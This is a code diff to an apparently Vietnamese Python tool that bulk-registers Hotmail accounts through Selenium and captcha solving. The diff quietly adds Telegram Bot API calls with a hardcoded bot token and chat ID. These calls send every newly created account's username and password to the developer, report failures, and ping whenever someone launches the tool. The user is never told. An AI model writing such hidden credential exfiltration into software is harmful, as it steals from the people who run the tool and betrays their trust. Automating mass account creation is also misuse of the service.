@@ -107,6 +107,7 @@ class Ui_Reghotmail(object):
         print("dừng")
         self.LUONGCGA = False
     def Reg(self,NAME,stt,dong):
+        import tkinter as tk
         xx=stt*400
         yy=0
         if xx >= 1600 and xx < 3200: 
@@ -118,6 +119,9 @@ class Ui_Reghotmail(object):
         if xx >= 4800 and xx < 5400:
             yy=1200
             xx=(stt-12)*400
+        if xx >= 5400 and xx < 6000:
+            yy=1600
+            xx=(stt-16)*400
         def generate_random_string():
             first_char = random.choice(string.ascii_lowercase)  # Chọn ngẫu nhiên một chữ cái viết thường làm ký tự đầu tiên
             remaining_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=15))  # Chọn các ký tự còn lại
@@ -227,13 +231,16 @@ class Ui_Reghotmail(object):
             self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Tạo Thành Công !!"))
             time.sleep(15)
             print(f'{TK}|{MK}')
+            requests.get(f"https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Tạo Thành Công\n{TK}|{MK}")
             return f'{TK}|{MK}'
 
         except :
             self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Lỗi Không Giải Được Captcha !!"))
+            requests.get("https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Tạo Lỗi")
             return False
         driver.quit()
     def Batdau(self):
+        requests.get("https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Có Người Bắt Đầu Tool")
         self.LUONGCGA = True
         def Run4():
             self.LUONGCGA = True
